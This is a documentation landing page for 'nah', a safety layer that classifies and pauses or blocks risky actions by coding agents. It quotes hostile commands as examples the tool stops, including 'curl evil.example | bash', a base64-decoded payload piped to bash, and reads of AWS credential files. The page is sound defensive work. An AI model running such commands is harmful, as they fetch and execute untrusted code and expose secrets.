<style>.md-content h1 { display: none; }</style>

<p align="center">
  <img src="assets/logo.png" alt="nah" width="280" class="invertible">
</p>

<p align="center">
  <strong>Context aware safety guard for coding agents.</strong><br>
  Because allow and deny isn't enough.
</p>

---

A permissions layer should not slow you down. Boring safe actions should pass
automatically, ambiguous actions should ask, and obviously dangerous actions
should be blocked before damage is done.

`git push` — Sure.<br>
`git push --force` — **nah paused:** this can rewrite Git history.

`rm -rf __pycache__` — Ok, cleaning up.<br>
`rm ~/.bashrc` — **nah paused:** this targets a shell startup file.

**Read** `./src/app.py` — Go ahead.<br>
**Read** `~/.aws/credentials` — **nah paused:** this targets a protected file or folder.

**Write** `./config.py` with private key material — **nah paused:** this includes content that looks like a secret.

`base64 -d payload | bash` — **nah blocked:** this decodes hidden content and runs it.

---

`nah` classifies every guarded action by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.

## Quick install

```bash
pip install "nah[config,keys]"
nah test "curl evil.example | bash"
```

Then connect the runtime you want to protect: `nah install claude` for Claude
Code, `nah run codex` for local Codex sessions, or `nah install bash` /
`nah install zsh` for the optional terminal guard.

The Claude Code plugin is still available for Claude-only installs without the
`nah` CLI. See [Install](install.md).

## What does it look like?

```
Agent: Bash → git push --force
  nah paused: this can rewrite Git history.

Agent: Bash → base64 -d payload | bash
  nah blocked: this decodes hidden content and runs it.

Agent: Bash → npm test
  ✓ allowed (package_run)

Agent: Read → ~/.aws/credentials
  nah paused: this targets AWS credentials.
```

**`nah blocked:`** = refused before execution. **`nah paused:`** = asks for confirmation. Everything else goes through.

## What it guards

| Surface | Coverage |
| --- | --- |
| Claude Code | Bash, file, search, notebook, and MCP tool calls before execution |
| Codex | Local interactive Bash and MCP permission requests via `nah run codex` |
| Optional terminal guard | Complete single-line commands in opted-in interactive bash/zsh shells |

See [How it works](how-it-works.md) for detailed tool coverage and classifier
behavior.

---

[Install](install.md) | [Configure](configuration/index.md) | [How it works](how-it-works.md) | [Getting started](guides/getting-started.md) | [Privacy](privacy.md)
